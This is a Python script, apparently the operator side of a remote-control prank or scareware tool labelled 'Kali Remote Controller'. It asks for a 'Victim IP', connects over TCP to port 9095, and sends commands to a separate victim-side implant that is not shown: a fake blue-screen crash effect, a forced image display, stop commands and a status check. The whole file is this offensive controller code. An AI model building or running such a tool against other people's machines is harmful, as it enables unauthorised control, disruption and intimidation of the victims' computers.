#!/usr/bin/env python3
"""
Kali Remote Controller - Full Manual Control
"""

import socket
import base64
import os

KALI_PORT = 9095

def send_image(image_path, VICTIM_IP):
    """Send and display image on victim"""
    if not os.path.exists(image_path):
        print(f"[-] Image not found: {image_path}")
        return
    
    with open(image_path, 'rb') as f:
        img_data = base64.b64encode(f.read()).decode()
    
    send_command(f"IMAGE:{img_data}", VICTIM_IP)

def send_command(cmd, VICTIM_IP):
    """Send command to victim"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((VICTIM_IP, KALI_PORT))
        sock.send(cmd.encode())
        response = sock.recv(4096).decode()
        print(f"[+] Response: {response}")
        sock.close()
    except ConnectionRefusedError:
        print(f"[-] Connection refused! Is victim server running?")
    except socket.timeout:
        print(f"[-] Connection timeout! Check IP address")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    # Get IP from user
    print("""
╔══════════════════════════════════════════════════════════════╗
║              KALI REMOTE CONTROLLER                          ║
║         FULL MANUAL CONTROL - STOP ANYTIME                   ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    VICTIM_IP = input("[🎯] Enter Victim IP Address: ").strip()
    
    if not VICTIM_IP:
        print("[-] No IP entered! Exiting...")
        return
    
    print(f"\n[✓] Target set to: {VICTIM_IP}:{KALI_PORT}")
    
    while True:
        print("\n" + "="*50)
        print("🔥 COMMANDS:")
        print("   1. 💀 CRASH - Start BSOD crash effect")
        print("   2. 🖼 IMAGE - Send image file")
        print("   3. 🛑 STOP ALL - Stop everything")
        print("   4. ⚡ STOP CRASH - Stop crash only")
        print("   5. 🖼 STOP IMAGE - Close image only")
        print("   6. 📊 STATUS - Check connection")
        print("   7. 🔄 CHANGE IP - Change target IP")
        print("   8. ❌ EXIT - Quit")
        print("="*50)
        
        choice = input("\n[>] Select option: ").strip()
        
        if choice == "1":
            send_command("CRASH", VICTIM_IP)
            print("[💀] Crash effect started! Use option 3 or 4 to stop")
        
        elif choice == "2":
            img_path = input("[>] Image path: ").strip()
            send_image(img_path, VICTIM_IP)
            print("[🖼] Image displayed! Use option 3 or 5 to close")
        
        elif choice == "3":
            send_command("STOP", VICTIM_IP)
            print("[🛑] All effects stopped!")
        
        elif choice == "4":
            send_command("STOP_CRASH", VICTIM_IP)
            print("[⚡] Crash effect stopped!")
        
        elif choice == "5":
            send_command("STOP_IMAGE", VICTIM_IP)
            print("[🖼] Image closed!")
        
        elif choice == "6":
            send_command("STATUS", VICTIM_IP)
        
        elif choice == "7":
            new_ip = input("[🎯] Enter new Victim IP: ").strip()
            if new_ip:
                VICTIM_IP = new_ip
                print(f"[✓] Target changed to: {VICTIM_IP}")
            else:
                print("[-] Invalid IP!")
        
        elif choice == "8":
            print("[!] Exiting...")
            break
        
        else:
            print("[-] Invalid choice!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Exited by user")
